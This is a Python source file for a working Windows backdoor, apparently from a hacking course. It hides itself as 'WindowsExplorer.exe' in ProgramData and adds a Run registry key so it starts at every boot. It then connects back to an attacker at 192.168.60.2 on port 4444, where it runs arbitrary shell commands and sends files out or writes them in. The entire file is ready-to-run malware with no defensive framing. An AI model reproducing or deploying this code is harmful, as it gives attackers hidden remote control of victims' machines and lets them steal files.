import socket, subprocess, os, json, base64, sys, shutil

class Backdoor:

    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def reliable_send(self, data):
        # Ensure the data is a string before sending
        if isinstance(data, bytes):
            data = data.decode()  # Decode bytes to string if necessary
        json_data = json.dumps(data)  # Convert the string data to JSON
        self.connection.send(json_data.encode())  # Send as bytes
    
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                chunk = self.connection.recv(1024).decode()
                if chunk:
                    # print(f"Received chunk: {chunk}")
                    json_data += chunk
                    try:
                        return json.loads(json_data)
                    except json.JSONDecodeError as e:
                        # print(f"Error decoding JSON: {e}")
                        continue
            except Exception as e:
                # print(f"Exception while receiving data: {e}")
                break

    def execute_system_cmd(self, command):
            # Run multiple commands in a single shell session using && for chaining
            # The /c argument tells cmd.exe to run the command and then terminate.
            full_cmd = f'cmd.exe /c "{command}"'
            DEVNULL = open(os.devnull, 'wb')
            result = subprocess.check_output(full_cmd, stderr=DEVNULL, stdin=DEVNULL, shell=True)
            return result
    
    def change_working_directory_to(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"
    
    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload successful.'

    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = ''
            try:
                if command[0].lower() == "exit":  # Handle exit command from the attacker
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download" and len(command) > 1:
                    command_result = self.read_file(command[1])
                elif command[0] == "upload" and len(command) > 2:
                    print("uploading")
                    command_result = self.write_file(command[1], command[2])
                    print(command_result)
                else:
                    command_result = self.execute_system_cmd(command[0]) # Execute the command
            except Exception:
                command_result = "[-] Error during command execution"
            self.reliable_send(command_result)# Send the result back to the attacker

    def become_persistent(self):
        # Define a location in ProgramData (which is persistent across reboots)
        evil_file_location = os.path.join(os.environ["ProgramData"], "MyApp", "WindowsExplorer.exe")

        # Ensure the target directory exists
        if not os.path.exists(os.path.dirname(evil_file_location)):
            os.makedirs(os.path.dirname(evil_file_location))

        # Check if the file already exists at the target location
        if not os.path.exists(evil_file_location):
            # Copy the current executable to the target location
            shutil.copyfile(sys.executable, evil_file_location)

            # Create a registry entry to ensure the program runs on startup
            # (This does not require admin privileges, unless you're adding to HKLM)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "{evil_file_location}"', shell=True)
try:
    my_backdoor = Backdoor("192.168.60.2", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()